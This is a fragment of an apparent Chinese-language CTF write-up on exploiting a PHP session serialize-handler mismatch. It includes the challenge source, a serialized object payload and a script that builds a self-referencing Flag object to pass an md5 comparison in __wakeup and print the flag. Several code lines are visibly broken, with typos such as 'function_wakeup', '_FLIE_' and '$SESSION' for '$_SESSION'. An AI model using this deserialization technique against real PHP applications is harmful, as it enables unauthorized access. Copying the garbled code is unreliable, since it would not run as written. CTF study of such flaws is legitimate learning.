highlight_file_(_FLIE_);
/*hint.php*/
session_start();
class Flag{
    public $name;
    public $her;
    function_wakeup(){
        $this->her=md5(rand(1,10000));
        if($this->name===$this->her){
            include('flag.php');
            echo $flag;
        }
    }
}
?>
```

**hint.php**

```php
<?php
highlight_file(_FILE_);
ini_set('session.serialize_handler','php_serialize');
session_start();
$SESSION['a']=$_GET['a'];
?>
```

声明session存储格式为php_serialize

默认页面如果是php格式处理session的序列化，读取时会对

O:4:"flag":2:{s:4:"name";N;s:3:"her";R:2;}进行反序列化，触发wakeup

**构造**

```php
<?php
class Flag{
    public $name;
    public $her;
}
$a=new Flag();
$a->name=&$a->her;
echo serialize($a);
?>
```